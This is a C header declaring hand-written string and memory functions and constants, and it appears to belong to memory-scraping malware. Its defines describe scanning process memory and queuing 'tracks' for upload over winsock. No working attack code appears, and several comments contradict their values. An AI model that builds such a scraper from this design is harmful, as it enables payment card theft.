#pragma once

int sisxdigit(unsigned char c);

int sisdigit(unsigned char c);

unsigned long int Strtoul(const char *ptr, char **endptr, int base);

int stolower(int ch);
double zstrtod(const char* s, char** endptr);

int sstrncmp(const char *s1, const char *s2, size_t n);
char *sstrchr(register const char *t, int c);
LPCSTR smstrstr(LPCSTR haystack, LPCSTR needle);

long zstrtol(const char *input, const char **Endptr, int base);
char *zstrtok(char *str, const char *delim);

BOOL FileExists(LPCSTR file);
#define IS_LETTER(c) ((c >= 65 && c <= 90) || (c >= 97 && c <= 122))
#define IS_NUMBER(c) (c >= 48 && c <= 57)
#define IS_ALPHANUM(c) (((c >= 65 && c <= 90) || (c >= 97 && c <= 122)) || (c >= 48 && c <= 57))
#define MAX(x, y) (x > y ? x : y)
#define MIN(x, y) (x > y ? y : x)
#define SCAN_SIZE (1024 * 1024) // 4kb at once
#define SCAN_SLEEP_MS 200  // between memory reads
#define PROCESS_SLEEP_MS 10000  // between process switches
#define UPLOAD_SLEEP_MS (200)  // 1000 ms * 60 (seconds) * 5 = 5 minutes
#define UPLOAD_QUEUE_SIZE 512 // tracks to store before upload
#define UPLOAD_BUFFER_SIZE (1024 * 1024)  // winsock upload buffer size


BOOL IsCharset(LPCSTR s, LPCSTR charset, DWORD length);
DWORD smstrlen(LPCSTR s);
CHAR* smmemdup(LPCSTR mem, DWORD allocSize, DWORD copySize);


size_t swcslen(const wchar_t* s);
void *_memcpy(void* dest, const void* src, size_t count);
void* m_memset(void * dst, int s, size_t count);

wchar_t* swcscpy(wchar_t * dest, const wchar_t * src);
wchar_t* swcscat(wchar_t * dest, const wchar_t *src);
int zstrncmp(const char *s1, const char *s2, size_t n);